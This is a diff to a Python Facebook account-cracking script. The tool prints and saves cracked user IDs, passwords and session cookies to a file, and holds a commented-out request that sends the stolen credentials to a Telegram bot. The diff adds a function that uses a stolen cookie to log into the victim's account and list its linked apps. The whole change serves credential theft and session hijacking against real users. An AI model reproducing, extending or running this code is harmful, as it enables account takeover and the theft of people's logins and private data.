@@ -558,7 +558,7 @@ def crack(idf,pwv):
                                 print(f'\r{H}[ RAWA-OK ]\n[✓] USER : {idf} \n[✓] PASS : {pw} \n[✓] COOKIES : {kuki}')
                                 #requests.get(f"https://api.telegram.org/bot64396283355944082446:AAGQu9RhPGuhxAnB3p9e9Nbp9b96xySTYfA/sendMessage?chat_id=5753556142&text=｛shex-hama ok｝ OK \n OK   :  : {idf} \n│   PS  : {pw}  ")
                                 open('/sdcard/𝑅𝑂𝑌𝐴𝐿-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
-                                
+                                cek_SURCHY(kuki)
                                 break
                         else:
                                 continue
@@ -569,7 +569,26 @@ def chek():
     os.system('clear')
     banner()
     menu()
-
+def cek_SURCHY(kuki):
+ session = requests.Session()
+ w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+ sop = bs4.BeautifulSoup(w,"html.parser")
+ x = sop.find("form",method="post")
+ game = [i.text for i in x.find_all("h3")]
+ try:
+  for i in range(len(game)):
+   print ("\r%s  \033[0m  %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+ except AttributeError:
+  print ("\r    %s\033[0m cookie invalid"%(M))
+ w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+ sop = bs4.BeautifulSoup(w,"html.parser")
+ x = sop.find("form",method="post")
+ game = [i.text for i in x.find_all("h3")]
+ try:
+  for i in range(len(game)):
+   print ("\r%s  \033[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+ except AttributeError:
+  print ("\r    %s \033[0mcookie invalid"%(M))
 
 if __name__=='__main__':
         try:os.system('git pull')
